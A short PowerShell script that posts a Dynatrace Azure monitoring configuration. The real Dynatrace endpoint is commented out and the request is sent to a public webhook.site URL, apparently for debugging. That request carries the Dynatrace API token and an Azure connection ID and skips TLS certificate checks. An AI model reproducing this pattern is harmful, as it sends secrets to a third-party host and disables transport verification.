$environment = "$($Env:dynatraceEnvironment ?? 'dev')"
#$endpoint = "https://$Env:dynatraceTenant.$environment.dynatracelabs.com/api/v2/extensions/azure/monitoringConfigurations"
$endpoint = "https://webhook.site/67fc63f3-ff55-4154-ac1c-78c1b1d206d3"

$jsonBody = @"
{
  "enabled": true,
  "description": "some_configuration",
  "version": "0.0.1",
  "featureSets": [],
  "azure": {
    "credentials": [
      {
        "description": "New Account",
        "enabled": true,
        "connectionId": "$($Env:connectionId)"
      }
    ]
  }
}
"@

Invoke-WebRequest -SkipCertificateCheck `
    -ContentType "application/json" `
    -Method POST `
    -Uri $endpoint `
    -Headers @{
        "Accept" = "application/json"
        "Authorization" = "Api-Token $Env:dynatraceApiKey"
    } `
    -Body ($jsonBody)